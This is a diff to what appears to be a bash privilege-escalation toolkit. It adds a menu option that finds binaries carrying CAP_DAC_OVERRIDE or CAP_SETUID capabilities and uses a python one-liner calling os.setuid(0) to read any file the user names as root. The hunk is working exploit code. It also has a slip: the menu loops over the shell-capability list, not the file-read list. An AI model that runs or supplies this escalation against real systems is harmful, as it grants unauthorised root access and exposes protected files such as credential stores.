@@ -207,6 +207,55 @@ while true; do
                 esac
             done               
             ;;
+
+        3)
+            echo "----- < File Read (CAP_DAC_OVERRIDE & CAP_SETUID Capabilities) > -----"
+            echo " "
+            if [ -z "$FileReadCap" ]; then
+                echo "No Vulnerables Binaries with Capabilities detected"
+                continue
+            else
+                echo "$FileReadCap"
+            fi
+
+            select choice in $ShellCap "Go Back"; do
+                case "$choice" in
+                    *python*)
+                        read -p "What file do you want to read ? : " FILE
+                        echo "Trying with python3"
+                        "$choice" -c 'import os;os.setuid(0);print(open("'$FILE'").read())'
+                        
+                        read -p "Do you want to read another file? [y/N] : " answer
+
+                        if [[ "$answer" =~ ^[Yy]$ ]]; then
+                            break
+                        else
+                            break 2
+                        fi
+                        ;;
+                    
+                    "Go Back")
+                        break
+                        ;;
+                    *)
+                        echo "Invalid Choice, Choose From : "
+                        printf '%s\n' "$ShellCap" | nl -w2 -s') '
+                        ;;
+                esac
+            done               
+            ;;
+
+
+
+
+
+
+
+
+
+
+
+            
         *)
             echo "Invalid Choice, Restart"
             echo " "
